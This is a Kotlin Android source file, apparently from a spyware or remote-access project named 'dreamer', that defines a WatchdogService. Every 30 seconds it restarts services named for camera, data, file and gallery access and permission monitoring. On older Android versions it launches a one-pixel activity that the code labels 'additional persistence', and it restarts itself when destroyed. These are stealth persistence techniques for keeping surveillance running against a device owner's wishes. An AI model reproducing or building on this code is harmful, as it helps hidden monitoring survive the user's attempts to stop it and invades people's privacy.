package com.h4k3r.dreamer

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit

class WatchdogService : Service() {
    companion object {
        private const val TAG = "WatchdogService"
        private const val CHECK_INTERVAL = 30L // 30 seconds
    }

    private lateinit var scheduler: ScheduledExecutorService
    private val restartAttempts = mutableMapOf<String, Int>()
    private val maxRestartAttempts = 5

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "WatchdogService created")
        scheduler = Executors.newScheduledThreadPool(1)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "WatchdogService started")
        
        // Start periodic checking
        scheduler.scheduleAtFixedRate({
            checkAndRestartServices()
        }, 0, CHECK_INTERVAL, TimeUnit.SECONDS)

        return START_STICKY
    }

    private fun checkAndRestartServices() {
        try {
            Log.d(TAG, "Checking services...")
            
            // Check if PermissionMonitorService is running
            if (!isServiceRunning(PermissionMonitorService::class.java)) {
                val name = PermissionMonitorService::class.java.simpleName
                val attempts = restartAttempts.getOrDefault(name, 0)
                if (attempts < maxRestartAttempts) {
                    val intent = Intent(this, PermissionMonitorService::class.java)
                    startService(intent)
                    restartAttempts[name] = attempts + 1
                } else {
                    Log.w(TAG, "$name failed to start $maxRestartAttempts times, backing off")
                }
            } else {
                restartAttempts[PermissionMonitorService::class.java.simpleName] = 0
            }

            // Check other services
            val services = listOf(
                CameraService::class.java,
                DataService::class.java,
                FilesService::class.java,
                GalleryService::class.java
            )

            services.forEach { serviceClass ->
                val name = serviceClass.simpleName
                if (!isServiceRunning(serviceClass)) {
                    val attempts = restartAttempts.getOrDefault(name, 0)
                    if (attempts < maxRestartAttempts) {
                        Log.d(TAG, "${serviceClass.simpleName} not running, restarting... (attempt ${attempts + 1})")
                        try {
                            val intent = Intent(this, serviceClass)
                            startService(intent)
                            restartAttempts[name] = attempts + 1
                        } catch (e: Exception) {
                            Log.e(TAG, "Failed to restart ${serviceClass.simpleName}", e)
                        }
                    } else {
                        Log.w(TAG, "$name failed to start $maxRestartAttempts times, backing off")
                    }
                } else {
                    restartAttempts[name] = 0 // reset on success
                }
            }
            
            // Start OnePixelActivity for additional persistence (only on Android < 12)
            if (android.os.Build.VERSION.SDK_INT < 31) {
                try {
                    val activityIntent = Intent(this, OnePixelActivity::class.java)
                    activityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(activityIntent)
                } catch (e: Exception) {
                    // Ignore if activity can't be started
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in service check", e)
        }
    }

    private fun isServiceRunning(serviceClass: Class<*>): Boolean {
        val manager = getSystemService(ACTIVITY_SERVICE) as android.app.ActivityManager
        val runningServices = manager.getRunningServices(Integer.MAX_VALUE)
        return runningServices.any { it.service.className == serviceClass.name }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "WatchdogService destroyed")
        scheduler.shutdown()
        
        // Try to restart itself
        val intent = Intent(this, WatchdogService::class.java)
        startService(intent)
    }

    override fun onBind(intent: Intent?): IBinder? = null
} 